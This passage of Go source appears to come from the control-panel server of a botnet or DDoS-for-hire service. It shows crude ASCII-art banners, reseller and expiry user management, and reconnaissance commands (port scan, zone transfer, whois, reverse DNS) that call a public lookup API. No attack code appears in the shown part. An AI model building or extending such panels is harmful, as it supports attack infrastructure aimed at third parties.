			this.conn.Write([]byte("\033[00;1;95m  ░░░░░███░░░██░░░░░░░░█░░░███░░░░░░░░███░░░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░█░░░░░███████████████░░░░░░░░░░░░░░█░░░░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░██░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m                                            ██    \033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "DAD" || cmd == "dad" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⠄⠄⠄⢰⣧⣼⣯⠄⣸⣠⣶⣶⣦⣾⠄⠄⠄⠄⡀⠄⢀⣿⣿⠄⠄⠄⢸⡇⠄\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⠄⠄⠄⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄⠸⢀⣿\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⠄⠄⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⠄⠄⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⠄⢀⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉⠋\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⠄⣼⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣥⣴⣿\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⢀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⢸⣿⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⠘⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾⠃\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁⠄⠄\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⠄⠄⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄⠄⠄⠄\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⠄⠄⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄⠄⠄⠄⢀⣠\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ⣿⣿⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⣠⣴⣿⣿\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "PUSSY" || cmd == "pussy" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m         ¶¶¶¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m        ¶¶´´´´¶¶¶¶¶´´¶¶¶¶´¶¶¶¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m        ¶´´´´´´´´´´¶¶¶¶´¶¶´´´´¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m        ¶´´´´´´´´´´¶´¶¶¶¶¶¶´´´¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m       ¶´´´´´´´´´´¶¶¶¶¶´´´¶¶¶¶¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m      ¶´´´´´´´´´´´´´´´´¶¶¶¶¶¶¶¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m     ¶´´´´´´´´´´´´´´´´´´´¶¶¶¶¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m   ¶¶¶´´´´´¶´´´´´´´´´´´´´´´´´¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m     ¶´´´´¶¶´´´´´´´´´´´´´´´´´¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m     ¶¶´´´´´´´´´´´´´´´´¶¶´´´´¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m    ¶¶¶´´´´´´´´´¶¶¶´´´´¶¶´´´¶¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m       ¶¶´´´´´´´´´´´´´´´´´´¶¶¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m         ¶¶¶´´´´´´´´´´´´´¶¶¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m           ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶\033[0m\r\n"))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "<3" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m      ¶¶¶¶¶¶´´´´´´¶¶¶¶¶¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m    ¶¶¶¶¶¶¶¶¶¶´´¶¶¶¶¶¶¶¶¶¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m   ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´¶¶¶¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´¶¶¶¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´¶¶¶¶¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶ ´¶¶¶¶¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m       ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m         ¶¶¶¶¶¶¶¶¶¶¶¶¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m           ¶¶¶¶¶¶¶¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m             ¶¶¶¶\033[0m\r\n"))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "ROOTED" || cmd == "rooted" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██████╗ \033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██╔══██╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██████╔╝\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██╔══██╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██║  ██║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ╚═╝  ╚═╝\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			time.Sleep(200 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██████╗  ██████╗ \033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██╔══██╗██╔═══██╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██████╔╝██║   ██║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██╔══██╗██║   ██║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██║  ██║╚██████╔╝\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ╚═╝  ╚═╝ ╚═════╝ \033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			time.Sleep(200 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██████╗  ██████╗  ██████╗ \033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██╔══██╗██╔═══██╗██╔═══██╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██████╔╝██║   ██║██║   ██║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██╔══██╗██║   ██║██║   ██║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██║  ██║╚██████╔╝╚██████╔╝\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ \033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			time.Sleep(200 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██████╗  ██████╗  ██████╗ ████████╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██████╔╝██║   ██║██║   ██║   ██║   \033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██╔══██╗██║   ██║██║   ██║   ██║   \033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██║  ██║╚██████╔╝╚██████╔╝   ██║   \033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   \033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			time.Sleep(200 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██████╗  ██████╗  ██████╗ ████████╗███████╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝██╔════╝\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██████╔╝██║   ██║██║   ██║   ██║   █████╗  \033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝  \033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝\033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			time.Sleep(200 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██████╗  ██████╗  ██████╗ ████████╗███████╗██████╗ \033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝██╔════╝██╔══██╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██████╔╝██║   ██║██║   ██║   ██║   █████╗  ██║  ██║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝  ██║  ██║\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗██████╔╝\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═════╝ \033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			time.Sleep(200 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██████╗  ██████╗  ██████╗ ████████╗███████╗██████╗       ██╗██████╗ \033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝██╔════╝██╔══██╗     ██╔╝╚════██╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██████╔╝██║   ██║██║   ██║   ██║   █████╗  ██║  ██║    ██╔╝  █████╔╝\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝  ██║  ██║    ╚██╗  ╚═══██╗\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗██████╔╝     ╚██╗██████╔╝\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═════╝       ╚═╝╚═════╝ \033[0m\r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "/IPLOOKUP" || cmd == "/iplookup" {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mIP\033[0m: "))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}

			url := "https://api.hackertarget.com/geoip/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[31mAn Error Occured! \033[00;1;95mPlease try again Later.\033[0m\r\n")))
				continue
			}

			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[31mAn Error Occured! \033[00;1;95mPlease try again Later.\033[0m\r\n")))
				continue
			}

			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\033[00;92mResults\033[0m: \r\n" + locformatted + "\r\n"))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "/PORTSCAN" || cmd == "/portscan" {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mIP\033[0m: "))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}

			url := "https://api.hackertarget.com/nmap/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[31mAn Error Occured! \033[00;1;95mPlease try again Later.\033[0m\r\n")))
				continue
			}

			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[31mError, \033[00;1;95mIP Address / Hostname Only!\033[0m\r\n")))
				continue
			}

			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\033[00;92mResults\033[0m: \r\n" + locformatted + "\r\n"))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "/WHOIS" || cmd == "/whois" {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mIP\033[0m: "))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}

			url := "https://api.hackertarget.com/whois/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[31mAn Error Occured! \033[00;1;95mPlease try again Later.\033[0m\r\n")))
				continue
			}

			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[31mAn Error Occured! \033[00;1;95mPlease try again Later.\033[0m\r\n")))
				continue
			}

			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\033[00;92mResults\033[0m: \r\n" + locformatted + "\r\n"))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "/PING" || cmd == "/ping" {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mIP\033[0m: "))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}

			url := "https://api.hackertarget.com/nping/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 60 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[31mAn Error Occured! \033[00;1;95mPlease try again Later.\033[0m\r\n")))
				continue
			}

			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[31mAn Error Occured! \033[00;1;95mPlease try again Later.\033[0m\r\n")))
				continue
			}

			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\033[00;92mResults\033[0m: \r\n" + locformatted + "\r\n"))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "/TRACEROUTE" || cmd == "/traceroute" {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mIP\033[0m: "))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}

			url := "https://api.hackertarget.com/mtr/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 60 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 60 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[31mAn Error Occured! \033[00;1;95mPlease try again Later.\033[0m\r\n")))
				continue
			}

			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[31mError, \033[00;1;95mIP Address Only!\033[0m\r\n")))
				continue
			}

			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\033[00;92mResults\033[0m: \r\n" + locformatted + "\r\n"))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "/RESOLVE" || cmd == "/resolve" {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mURL (Without www)\033[00;1;96m: "))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}

			url := "https://api.hackertarget.com/hostsearch/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 15 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[31mAn Error Occured! \033[00;1;95mPlease try again Later.\033[0m\r\n")))
				continue
			}

			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[31mError, \033[00;1;95mIP Address Only!\033[0m\r\n")))
				continue
			}

			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\033[00;92mResults\033[0m: \r\n" + locformatted + "\r\n"))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "/REVERSEDNS" || cmd == "/reversedns" {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mIP\033[0m: "))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}

			url := "https://api.hackertarget.com/reverseiplookup/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[31mAn Error Occured! \033[00;1;95mPlease try again Later.\033[0m\r\n")))
				continue
			}

			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[31mAn Error Occured! \033[00;1;95mPlease try again Later.\033[0m\r\n")))
				continue
			}

			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\033[00;92mResults\033[0m: \r\n" + locformatted + "\r\n"))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "/ASNLOOKUP" || cmd == "/asnlookup" {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mIP\033[0m: "))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}

			url := "https://api.hackertarget.com/aslookup/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 15 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[31mAn Error Occured! \033[00;1;95mPlease try again Later.\033[0m\r\n")))
				continue
			}

			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[31mAn Error Occured! \033[00;1;95mPlease try again Later.\033[0m\r\n")))
				continue
			}

			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\033[00;92mResults\033[0m: \r\n" + locformatted + "\r\n"))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "/SUBNETCALC" || cmd == "/subnetcalc" {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mIP\033[0m: "))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}

			url := "https://api.hackertarget.com/subnetcalc/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[31mAn Error Occured! \033[00;1;95mPlease try again Later.\033[0m\r\n")))
				continue
			}

			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[31mAn Error Occured! \033[00;1;95mPlease try again Later.\033[0m\r\n")))
				continue
			}

			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\033[00;92mResults\033[0m: \r\n" + locformatted + "\r\n"))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "/ZONETRANSFER" || cmd == "/zonetransfer" {
			this.conn.Write([]byte("                                \033[00;1;96m║\033[00;1;95mIPv4 Or Website (Without www)\033[00;1;96m: "))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}

			url := "https://api.hackertarget.com/zonetransfer/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 15 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[31mAn Error Occured! \033[00;1;95mPlease try again Later.\033[0m\r\n")))
				continue
			}

			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("                                \033[00;1;96m║\033[31mAn Error Occured! \033[00;1;95mPlease try again Later.\033[0m\r\n")))
				continue
			}

			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\033[00;92mResults\033[0m: \r\n" + locformatted + "\r\n"))
			continue
		}

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		args := strings.Split(cmd, " ")
		switch strings.ToLower(args[0]) {
		case "passwd":

			fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[00;1;95mCurrent Password\033[0m: ")
			currentPassword, err := this.ReadLine(true)
			if err != nil {
				return
			}

			if currentPassword != password {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mIncorrect Password!\r")
				continue
			}

			fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[00;1;95mNew Password\033[0m: ")
			newPassword, err := this.ReadLine(true)
			if err != nil {
				return
			}

			fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[00;1;95mConfirm Password\033[0m: ")
			confirmPassword, err := this.ReadLine(true)
			if err != nil {
				return
			}

			if len(newPassword) < 6 {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mYour Password Is Not Secure!\033[0m\r")
				continue
			}

			if confirmPassword != newPassword {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mYour Passwords Do Not Match!\033[0m\r")
				continue
			}

			if database.ChangeUsersPassword(username, newPassword) == false {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mFailed To Chnaged Password!\033[0m\r")
				continue
			}

			fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[00;92mYour Password Has Changed!\033[0m\r")
			password = newPassword
			continue

		/*--------------------------------------------------------------------------------------------------------------------------------------------*/

		case "editexpiry":

			if userInfo.admin == 0 && userInfo.Reseller == false {
				fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[31mYou Must Be An Admin!\033[00;0m\r\n")
				continue
			}

			if len(args) < 2 {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[00;1;95mSyntax: editexpiry (username)\033[00;0m\r")
				continue
			}

			user, err := database.GetUser(args[1])
			if err != nil {
				fmt.Fprintln(this.conn, "                                \033[00;1;96m║\033[31mUser Not Found!\033[00;0m\r")
				continue
			}

			var subordinate bool
			for _, id := range userInfo.Subordinates {
				if id == user.ID {
					subordinate = true
				}
			}

			if subordinate == false && userInfo.admin == 0 {
				fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[31mYou Cant Manage This User!\033[00;0m\r\n")
				continue
			}

			fmt.Fprint(this.conn, "                                \033[00;1;96m║\033[00;1;95mNew Expiry: ")
			expireDays, err := this.ReadLine(false)
